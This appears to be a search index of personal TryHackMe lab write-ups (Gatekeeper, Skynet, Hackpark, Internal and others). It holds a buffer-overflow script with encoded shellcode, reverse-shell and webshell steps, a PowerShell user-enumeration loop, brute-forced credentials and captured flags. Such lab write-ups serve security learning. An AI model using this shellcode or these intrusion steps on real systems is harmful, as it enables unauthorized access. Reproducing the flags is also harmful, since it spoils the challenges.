\"\\xba\\x43\\xa3\\x7c\\x5b\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\\x52\\x31\\x56\\x12\\x83\\xc6\\x04\\x03\\x15\\xad\\x9e\\xae\\x65\\x59\\xdc\\x51\\x95\\x9a\\x81\\xd8\\x70\\xab\\x81\\xbf\\xf1\\x9c\\x31\\xcb\\x57\\x11\\xb9\\x99\\x43\\xa2\\xcf\\x35\\x64\\x03\\x65\\x60\\x4b\\x94\\xd6\\x50\\xca\\x16\\x25\\x85\\x2c\\x26\\xe6\\xd8\\x2d\\x6f\\x1b\\x10\\x7f\\x38\\x57\\x87\\x6f\\x4d\\x2d\\x14\\x04\\x1d\\xa3\\x1c\\xf9\\xd6\\xc2\\x0d\\xac\\x6d\\x9d\\x8d\\x4f\\xa1\\x95\\x87\\x57\\xa6\\x90\\x5e\\xec\\x1c\\x6e\\x61\\x24\\x6d\\x8f\\xce\\x09\\x41\\x62\\x0e\\x4e\\x66\\x9d\\x65\\xa6\\x94\\x20\\x7e\\x7d\\xe6\\xfe\\x0b\\x65\\x40\\x74\\xab\\x41\\x70\\x59\\x2a\\x02\\x7e\\x16\\x38\\x4c\\x63\\xa9\\xed\\xe7\\x9f\\x22\\x10\\x27\\x16\\x70\\x37\\xe3\\x72\\x22\\x56\\xb2\\xde\\x85\\x67\\xa4\\x80\\x7a\\xc2\\xaf\\x2d\\x6e\\x7f\\xf2\\x39\\x43\\xb2\\x0c\\xba\\xcb\\xc5\\x7f\\x88\\x54\\x7e\\x17\\xa0\\x1d\\x58\\xe0\\xc7\\x37\\x1c\\x7e\\x36\\xb8\\x5d\\x57\\xfd\\xec\\x0d\\xcf\\xd4\\x8c\\xc5\\x0f\\xd8\\x58\\x49\\x5f\\x76\\x33\\x2a\\x0f\\x36\\xe3\\xc2\\x45\\xb9\\xdc\\xf3\\x66\\x13\\x75\\x99\\x9d\\xf4\\xba\\xf6\\x9c\\x74\\x53\\x05\\x9e\\x65\\xff\\x80\\x78\\xef\\xef\\xc4\\xd3\\x98\\x96\\x4c\\xaf\\x39\\x56\\x5b\\xca\\x7a\\xdc\\x68\\x2b\\x34\\x15\\x04\\x3f\\xa1\\xd5\\x53\\x1d\\x64\\xe9\\x49\\x09\\xea\\x78\\x16\\xc9\\x65\\x61\\x81\\x9e\\x22\\x57\\xd8\\x4a\\xdf\\xce\\x72\\x68\\x22\\x96\\xbd\\x28\\xf9\\x6b\\x43\\xb1\\x8c\\xd0\\x67\\xa1\\x48\\xd8\\x23\\x95\\x04\\x8f\\xfd\\x43\\xe3\\x79\\x4c\\x3d\\xbd\\xd6\\x06\\xa9\\x38\\x15\\x99\\xaf\\x44\\x70\\x6f\\x4f\\xf4\\x2d\\x36\\x70\\x39\\xba\\xbe\\x09\\x27\\x5a\\x40\\xc0\\xe3\\x7a\\xa3\\xc0\\x19\\x13\\x7a\\x81\\xa3\\x7e\\x7d\\x7c\\xe7\\x86\\xfe\\x74\\x98\\x7c\\x1e\\xfd\\x9d\\x39\\x98\\xee\\xef\\x52\\x4d\\x10\\x43\\x52\\x44;\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\")","title":"Exploit development"},{"location":"TryHackMe/Gatekeeper/#exploit","text":"I created a new payload and adjusted the POC to match the actual target and it worked! I got a shell as the user natbat . No special privileges. This is a pretty old version of windows, I could probably find a privesc vulnerability relatively easy.","title":"Exploit"},{"location":"TryHackMe/Gatekeeper/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"TryHackMe/Gatekeeper/#windows-exploit-suggester","text":"I exfiltrated a copy of systeminfo and passed it to windows-exploit-suggester.py Then I used some grep magic to search for privesc. cat exploitSuggester | grep Priv | grep -E \"^MS..-...\" MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important","title":"Windows Exploit Suggester"},{"location":"TryHackMe/Gatekeeper/#winpeas","text":"I used WinPEAS.bat to enumerate from the inside. I keep seeing references to firefox on the target. WinPEAS also didn't see patches for many vulnerabilities on this machine. The smb Users share is at C:\\Users\\ Hostname: Gatekeeper The Firewall is up and running a Standard profile. Allowed programs configuration for Standard profile: Mode Traffic direction Name / Program Enable Inbound dostackbufferoverflowgood.exe / C:\\users\\mayor\\desktop\\dostackbufferoverflowgood.exe There seems to be some file dostackbufferoverflowgood.exe . I did see one internal port running... Found 2 ports that are open internally only: UDP 127.0.0.1:1900 : 2200 UDP 127.0.0.1:57514 : 2200 Couldn't set up port forwarding because I'm not admin.","title":"WinPEAS"},{"location":"TryHackMe/Gatekeeper/#beware-of-fire","text":"It's been a few days since I gained initial access to this box. I was thinking tonight about the clues on this box and was trying to figure out what this meant: there's fire on the other side. There were some ports that were only available on localhost, so in a sense that would be like a firewall. I thought this was the fire. Tonight I really wanted to dig in and see if this \"fire on the other side\" was a firewall or something else. As I was reviewing the software I remembered Firefox is instlled on this one. I remember seeing a *.lnk file right next to the user.txt. I think I brushed this off initially as a \"too-obvious\" rabbit-hole type of trap...but maybe the answer was staring me in the face the whole time.","title":"Beware of fire"},{"location":"TryHackMe/Mr%20Robot/","text":"Mr. Robot \u00b6 Scanning \u00b6 Ran nmap quick scan sudo nmap -sS -F -T5 10.10.31.9 Two ports are open ( 80,443 ) which are running webservers. One port is closed ( 22 ) which is running ssh. Webserver on 80 \u00b6 The front end is similar to a flash video game. You can enter different commands which each display some content. I examined the startup video closely, there don't appear to be any flags in there. Robots.txt \u00b6 Get each Robots.txt page key-1-of-3.txt 073403c8a58a1f80d943455fb30724b9 Hint 2 \u00b6 I quickly examined the startup video...nothing there. From checking CSS it appears there's a footer with white text that appears when you hover it. WordPress - Version 4.3.1 \u00b6 Theme twentyfifteen \u00b6","title":"Mr. Robot"},{"location":"TryHackMe/Mr%20Robot/#mr-robot","text":"","title":"Mr. Robot"},{"location":"TryHackMe/Mr%20Robot/#scanning","text":"Ran nmap quick scan sudo nmap -sS -F -T5 10.10.31.9 Two ports are open ( 80,443 ) which are running webservers. One port is closed ( 22 ) which is running ssh.","title":"Scanning"},{"location":"TryHackMe/Mr%20Robot/#webserver-on-80","text":"The front end is similar to a flash video game. You can enter different commands which each display some content. I examined the startup video closely, there don't appear to be any flags in there.","title":"Webserver on 80"},{"location":"TryHackMe/Mr%20Robot/#robotstxt","text":"Get each Robots.txt page key-1-of-3.txt 073403c8a58a1f80d943455fb30724b9","title":"Robots.txt"},{"location":"TryHackMe/Mr%20Robot/#hint-2","text":"I quickly examined the startup video...nothing there. From checking CSS it appears there's a footer with white text that appears when you hover it.","title":"Hint 2"},{"location":"TryHackMe/Mr%20Robot/#wordpress-version-431","text":"","title":"WordPress - Version 4.3.1"},{"location":"TryHackMe/Mr%20Robot/#theme-twentyfifteen","text":"","title":"Theme twentyfifteen"},{"location":"TryHackMe/Skynet/","text":"Skynet \u00b6 Recon \u00b6 The room is terminator themed. There is a user named Miles and we need to figure out his email password. There is a hidden directory File inclusion is mentioned. Port Scan \u00b6 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 syn-ack ttl 61 Dovecot pop3d 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap syn-ack ttl 61 Dovecot imapd 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%) Enumeration \u00b6 22: OpenSSH 7.2p2 \u00b6 80: Apache 2.4.18 - SquirrelMail 1.4.23 \u00b6 Each login attempt on Squirrel Mail takes 4+ seconds - not viable for a bruteforce. 110: Dovecot pop3d \u00b6 139: Samba smbd 4.3.11-Ubuntu \u00b6 143: Dovecot imapd \u00b6 445: Samba 4.3.11 \u00b6 Gaining access \u00b6 Connected to anonymous Samba share on 139 using Anonymous Log1.txt contains what appear to be passwords. The first one listed is Miles' login for squirrelmail username : milesdyson password : cyborg007haloterminator Miles' SMB password is in email. \u00b6 )s{A&2Z=F^n_E.B` Connected to Miles' SMB share, in the folder Notes there is a file important.txt with contents: /45kra24zxs28v3yd another directory! version 1.4.23 is vulnerable to RFI. Weaponization \u00b6 Couldn't figure out what to do next. Found there was an exploit for cuppa CMS - RFI and LFI Turned to writeup to see that the next step was to use RFI on the Cuppa CMS page. Got webshell Moved to a reverse meterpreter (more compatible with privesc modules in metasploit linux/local/ufo_privilege_escalation worked to get root 3f0372db24753accc7179a282cd6a949","title":"Skynet"},{"location":"TryHackMe/Skynet/#skynet","text":"","title":"Skynet"},{"location":"TryHackMe/Skynet/#recon","text":"The room is terminator themed. There is a user named Miles and we need to figure out his email password. There is a hidden directory File inclusion is mentioned.","title":"Recon"},{"location":"TryHackMe/Skynet/#port-scan","text":"PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 syn-ack ttl 61 Dovecot pop3d 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap syn-ack ttl 61 Dovecot imapd 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)","title":"Port Scan"},{"location":"TryHackMe/Skynet/#enumeration","text":"","title":"Enumeration"},{"location":"TryHackMe/Skynet/#22-openssh-72p2","text":"","title":"22: OpenSSH 7.2p2"},{"location":"TryHackMe/Skynet/#80-apache-2418-squirrelmail-1423","text":"Each login attempt on Squirrel Mail takes 4+ seconds - not viable for a bruteforce.","title":"80: Apache 2.4.18 - SquirrelMail 1.4.23"},{"location":"TryHackMe/Skynet/#110-dovecot-pop3d","text":"","title":"110: Dovecot pop3d"},{"location":"TryHackMe/Skynet/#139-samba-smbd-4311-ubuntu","text":"","title":"139: Samba smbd 4.3.11-Ubuntu"},{"location":"TryHackMe/Skynet/#143-dovecot-imapd","text":"","title":"143: Dovecot imapd"},{"location":"TryHackMe/Skynet/#445-samba-4311","text":"","title":"445: Samba 4.3.11"},{"location":"TryHackMe/Skynet/#gaining-access","text":"Connected to anonymous Samba share on 139 using Anonymous Log1.txt contains what appear to be passwords. The first one listed is Miles' login for squirrelmail username : milesdyson password : cyborg007haloterminator","title":"Gaining access"},{"location":"TryHackMe/Skynet/#miles-smb-password-is-in-email","text":")s{A&2Z=F^n_E.B` Connected to Miles' SMB share, in the folder Notes there is a file important.txt with contents: /45kra24zxs28v3yd another directory! version 1.4.23 is vulnerable to RFI.","title":"Miles' SMB password is in email."},{"location":"TryHackMe/Skynet/#weaponization","text":"Couldn't figure out what to do next. Found there was an exploit for cuppa CMS - RFI and LFI Turned to writeup to see that the next step was to use RFI on the Cuppa CMS page. Got webshell Moved to a reverse meterpreter (more compatible with privesc modules in metasploit linux/local/ufo_privilege_escalation worked to get root 3f0372db24753accc7179a282cd6a949","title":"Weaponization"},{"location":"TryHackMe/Untitled/","text":"","title":"Untitled"},{"location":"TryHackMe/Vulnnet%20Roasted/","text":"Vulnnet Roasted \u00b6 Port scan \u00b6 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2022-02-21 18:42:23Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing 49665/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49676/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49683/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49699/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Found the host name: vulnnet-rst.local0","title":"Vulnnet Roasted"},{"location":"TryHackMe/Vulnnet%20Roasted/#vulnnet-roasted","text":"","title":"Vulnnet Roasted"},{"location":"TryHackMe/Vulnnet%20Roasted/#port-scan","text":"PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2022-02-21 18:42:23Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing 49665/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49676/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49683/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49699/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Found the host name: vulnnet-rst.local0","title":"Port scan"},{"location":"TryHackMe/Vulnversity/","text":"Vulnversity \u00b6 Port 3333 looks promising \u00b6 SUID binaries \u00b6","title":"Vulnversity"},{"location":"TryHackMe/Vulnversity/#vulnversity","text":"","title":"Vulnversity"},{"location":"TryHackMe/Vulnversity/#port-3333-looks-promising","text":"","title":"Port 3333 looks promising"},{"location":"TryHackMe/Vulnversity/#suid-binaries","text":"","title":"SUID binaries"},{"location":"TryHackMe/hackpark/","text":"Hackpark \u00b6 Recon \u00b6 The intro mentions Brute Forcing logins Priv Esc Windows Ping is off Scanning \u00b6 Since ping is off, we will need to use the -Pn flag. nmap -PnV -T5 10.10.38.171 Web Server :80 \u00b6 Browser \u00b6 Whatweb scan \u00b6 Wappalyzer addon \u00b6 Plan \u00b6 [x] Need to find a login page /admin [x] Brute force login page to get greds admin:1qaz2wsx [x] Log in After logging in, can view the framework/version Searchsploit blogengine 3.3.6 searchsploit -m 46353 The found exploit uses CVE-2019-6714 Update line 51 with IP and PORT of listener on attack box. Next steps Initial Foothold Enumeration \u00b6 SystemInfo Users Exploit \u00b6 Uploaded a reverse meterpreter using the same method as 46353.cs Set up a listener to catch the reverse meterpreter. msfconsole run Then back on the iis apppool\\blog shell, run the uploaded code. Had to find the upload location Navagate to the proper directory then run the code We got a reverse shell, though the user is still Blog. WinPEAS seems to think we can use this autorun to run binaries. What's the file though... user flag: 759bd8af507517bcfaede78a21a73e39 root flag: 7e13d97f05f7ceb9881a3eb3d78d3e72","title":"Hackpark"},{"location":"TryHackMe/hackpark/#hackpark","text":"","title":"Hackpark"},{"location":"TryHackMe/hackpark/#recon","text":"The intro mentions Brute Forcing logins Priv Esc Windows Ping is off","title":"Recon"},{"location":"TryHackMe/hackpark/#scanning","text":"Since ping is off, we will need to use the -Pn flag. nmap -PnV -T5 10.10.38.171","title":"Scanning"},{"location":"TryHackMe/hackpark/#web-server-80","text":"","title":"Web Server :80"},{"location":"TryHackMe/hackpark/#browser","text":"","title":"Browser"},{"location":"TryHackMe/hackpark/#whatweb-scan","text":"","title":"Whatweb scan"},{"location":"TryHackMe/hackpark/#wappalyzer-addon","text":"","title":"Wappalyzer addon"},{"location":"TryHackMe/hackpark/#plan","text":"[x] Need to find a login page /admin [x] Brute force login page to get greds admin:1qaz2wsx [x] Log in After logging in, can view the framework/version Searchsploit blogengine 3.3.6 searchsploit -m 46353 The found exploit uses CVE-2019-6714 Update line 51 with IP and PORT of listener on attack box. Next steps Initial Foothold","title":"Plan"},{"location":"TryHackMe/hackpark/#enumeration","text":"SystemInfo Users","title":"Enumeration"},{"location":"TryHackMe/hackpark/#exploit","text":"Uploaded a reverse meterpreter using the same method as 46353.cs Set up a listener to catch the reverse meterpreter. msfconsole run Then back on the iis apppool\\blog shell, run the uploaded code. Had to find the upload location Navagate to the proper directory then run the code We got a reverse shell, though the user is still Blog. WinPEAS seems to think we can use this autorun to run binaries. What's the file though... user flag: 759bd8af507517bcfaede78a21a73e39 root flag: 7e13d97f05f7ceb9881a3eb3d78d3e72","title":"Exploit"},{"location":"TryHackMe/internal/","text":"Internal \u00b6 Recon \u00b6 The intro mentions Flags \u00b6 - User.txt - Root.txt Rules \u00b6 - Modify hosts file to reflect internal.thm - All tools/techniques are allowed. - Locate and note all vulnerabilites on the machine. - Submit flags to dashboard. - Stay in scope - this IP only. Service Enumeration \u00b6 \u2514\u2500$ nmap -sV -T5 10.10.123.49 | tee quickscan Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:30 CDT Nmap scan report for 10.10.123.49 Host is up (0.20s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds OpenSSH 7.6p1 \u00b6 Possible Username Enumeration User aubreanna Try to brute force. Apache 2.4.29 (ubuntu) \u00b6 Possible RCE and PrivEsc WebServer \u00b6 Default Apache frontpage. Feroxbuster \u00b6 Ran another Feroxbuster for /blog 200 83l 284w 4530c http://internal.thm/blog/wp-login.php 200 328l 3640w 0c http://internal.thm/blog/ 200 97l 823w 7278c http://internal.thm/blog/readme.html 200 5l 15w 135c http://internal.thm/blog/wp-trackback.php 200 384l 3177w 19915c http://internal.thm/blog/license.txt 200 0l 0w 0c http://internal.thm/blog/wp-config.php 200 0l 0w 0c http://internal.thm/blog/wp-cron.php 200 0l 0w 0c http://internal.thm/blog/wp-blog-header.php 200 11l 23w 223c http://internal.thm/blog/wp-links-opml.php 200 0l 0w 0c http://internal.thm/blog/wp-load.php 301 9l 28w 320c http://internal.thm/blog/wp-admin 301 0l 0w 0c http://internal.thm/blog/index.php 301 9l 28w 323c http://internal.thm/blog/wp-includes 301 9l 28w 322c http://internal.thm/blog/wp-content 302 0l 0w 0c http://internal.thm/blog/wp-signup.php 302 0l 0w 0c http://internal.thm/blog/wp-activate.php 500 0l 0w 0c http://internal.thm/blog/wp-settings.php PHP (gotta be higher than 5.6.20 per phpMyAdmin) \u00b6 phpMyAdmin 4.6.6 \u00b6 Login Page FeroxBuster $ feroxbuster -u http://internal.thm:80/phpmyadmin/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/tryhackme/boxes/active/internal/results/scans/tcp80/tcp_80_http_phpmyadmin_feroxbuster_raft-large-words.txt\" 403 9l 28w 277c http://internal.thm/phpmyadmin/.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.txt 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.asp 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.aspx 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.jsp 403 9l 28w 277c http://internal.thm/phpmyadmin/templates 301 9l 28w 324c http://internal.thm/phpmyadmin/themes 301 9l 28w 320c http://internal.thm/phpmyadmin/js 200 26l 359w 0c http://internal.thm/phpmyadmin/index.php 200 26l 359w 0c http://internal.thm/phpmyadmin/themes.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm 403 9l 28w 277c http://internal.thm/phpmyadmin/libraries 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.txt 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.asp 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.aspx 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.jsp 200 26l 359w 0c http://internal.thm/phpmyadmin/logout.php [ ] Brute Force Wordpress 5.4.2 \u00b6 $ wpscan http://internal.thm:80/blog/ -o wpscan Results [+] URL: http://internal.thm/blog/ [10.10.41.223] [+] Started: Sat Nov 6 13:22:11 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator> | - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator> [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/ | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3' XML-RPC \u00b6 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Cuckoo Sandbox Guest 2.0.1 - XMLRPC Privileged Remote Code Execution | windows/remote/40043.py Movable Type 7 r.5002 - XMLRPC API OS Command Injection (Metasploit) | cgi/webapps/50464.rb PHP 5.3.2 'xmlrpc' Extension - Multiple Remote Denial of Service Vulnerabilities | php/dos/33755.php PHPXMLRPC < 1.1 - Remote Code Execution | php/webapps/43829.txt SonicWall Global Management System - XMLRPC set_time_zone Command Injection (Metasploit) | linux/remote/45124.rb vBulletin 4.x - breadcrumbs via xmlrpc API (Authenticated) SQL Injection | php/webapps/40115.py vBulletin 4.x/5.x - AdminCP/ApiLog via xmlrpc API (Authenticated) Persistent Cross-Site Scripting | php/webapps/40114.py WordPress Core 1.5.1.2 - 'xmlrpc' Interface SQL Injection | php/webapps/1077.pl WordPress Core 2.1.2 - 'xmlrpc' SQL Injection | php/webapps/3656.pl WordPress Core 2.2 - 'xmlrpc.php' SQL Injection | php/webapps/4039.txt WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service | php/dos/47800.py XML-RPC Library 1.3.0 - 'xmlrpc.php' Arbitrary Code Execution (Metasploit) | php/webapps/16882.rb XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Code Injection | php/webapps/1078.pl XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (2) | php/webapps/1083.pl XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (3) | php/webapps/1084.pl XOOPS 2.0.11 - 'xmlrpc.php' SQL Injection | php/webapps/1082.pl Yukihiro Matsumoto Ruby 1.x - XMLRPC Server Denial of Service | linux/dos/27723.txt ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- WordPress readme found: http://internal.thm/blog/readme.html \u00b6 System requirements are laid out in the readme. WordPress version 5.4.2 \u00b6 https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce WordPress theme twentyseventeen v 2.3 (80%) \u00b6 Login Page Username disclosure \u00b6 found username admin on blog post Forgot password can be brute forced to check for valid users invalid username valid username Powershell to bruteforce $validUsers = [System.collections.arraylist]::new(); $usernames | %{ >> $user = $_; >> $body = \"user_login=$user&redirect_to=&wp-submit=Get+New+Password\"; >> $r = Invoke-RestMethod -Method POST -Uri $url -Body $body; >> if($r -like \"*no account*\"){Write-Host -ForegroundColor Red $user}else{Write-Host -ForegroundColor Green $user; $validUsers.Add($user)>$null;} >> $validUsers >> } ZAP bruteforce with username: admin passwordfile: rockyou.txt Wordpress Login \u00b6 Username: admin Password: my2boys Following this Guide: https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce 1. Go to Dashboard > Appearance > Theme Editor > 404 Template 2. Paste the contents of a php reverse shell - using /usr/share/webshells/php/php-reverse-shell.php for this test. 1. Change lines 49 and 50 to reflect your shell listener. 3. Load the 404 page. 1. URL http://internal.thm/blog/index.php/2020/08/03/6/ Caught the shell with netcat. \u2514\u2500$ nc -nvlp 4455 listening on [any] 4455 ... connect to [10.2.73.217] from (UNKNOWN) [10.10.251.234] 58026 Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 21:13:57 up 52 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ whoami www-data $ www-data has nearly no permissions, but he can read /etc/passwd $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 